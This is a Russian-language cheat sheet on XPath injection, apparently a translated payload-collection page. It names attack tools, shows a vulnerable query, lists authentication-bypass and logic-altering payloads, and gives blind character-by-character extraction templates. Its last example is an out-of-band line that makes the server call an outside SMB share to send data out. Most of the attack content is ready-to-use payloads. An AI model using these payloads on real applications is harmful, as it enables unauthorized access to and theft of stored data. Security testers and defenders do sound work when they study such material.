**XPATH-инъекция**

XPath-инъекция — это техника атаки, используемая для эксплуатации приложений, которые формируют XPath-запросы (XML Path Language) на основе пользовательского ввода для запроса данных или навигации по XML-документам.

**Содержание**

*   Инструменты
*   Методология
    *   Слепая эксплуатация
    *   Внеполосная эксплуатация
*   Лабораторные работы
*   Ссылки

**Инструменты**

*   **orf/xcat** — автоматизация атак XPath-инъекций для извлечения документов
*   **feakk/xxxpwn** — продвинутый инструмент для XPath-инъекций
*   **aayla-secura/xxxpwn_smart** — форк xxxpwn, использующий предсказательное текстовое моделирование
*   **micsoftvn/xpath-blind-explorer**
*   **Harshal35/XmlChor** — инструмент для эксплуатации XPath-инъекций

**Методология**

Похоже на SQL-инъекцию, цель состоит в том, чтобы правильно завершить запрос. Рассмотрим пример уязвимого выражения:

```xpath
string(//user[name/text()='" + vuln_var1 + "' and password/text()='" + vuln_var2 + "']/account/text())
```

**Примеры полезных нагрузок для изменения логики запроса:**

*   `' or '1'='1`
*   `' or ''=''`
*   `x' or 1=1 or 'x'='y`
*   `/`
*   `//`
*   `//*`
*   `*/*`
*   `@*`
*   `count(/child::node())`
*   `x' or name()='username' or 'x'='y`
*   `' and count(/*)=1 and '1'='1`
*   `' and count(/@*)=1 and '1'='1`
*   `' and count(/comment())=1 and '1'='1`
*   `')] | //user/*[contains(*,'`
*   `') and contains(../password,'c`
*   `') and starts-with(../password,'c`

**Слепая эксплуатация**

Когда результат запроса не отображается напрямую, можно использовать методы слепой инъекции для извлечения данных посимвольно.

**Определение длины строки:**

```
and string-length(account)=SIZE_INT
```

**Извлечение символа с помощью функции `substring` и проверка его значения с помощью `codepoints-to-string`:**

```
substring(//user[userid=5]/username,2,1)=CHAR_HERE
substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)
```

**Внеполосная эксплуатация**

Этот метод используется для извлечения данных или взаимодействия с внешними системами, например, через SMB-запросы.

```
http://example.com/?title=Foundation&type=*&rent_days=* and doc('//10.10.10.10/SHARE')
```
